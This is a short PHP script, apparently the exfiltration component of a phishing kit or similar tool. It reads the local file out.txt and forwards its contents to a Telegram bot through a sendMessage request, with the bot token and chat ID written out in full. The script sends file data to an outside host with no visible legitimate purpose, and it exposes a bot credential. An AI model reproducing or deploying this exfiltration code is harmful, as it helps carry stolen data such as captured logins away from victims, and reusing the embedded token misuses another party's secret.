<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot2034520940:AAE5mBFnqMjXAa1Y_bOJSHUDB6ujHQuJOkY/sendMessage?chat_id=105776474&text=$msg");
?>
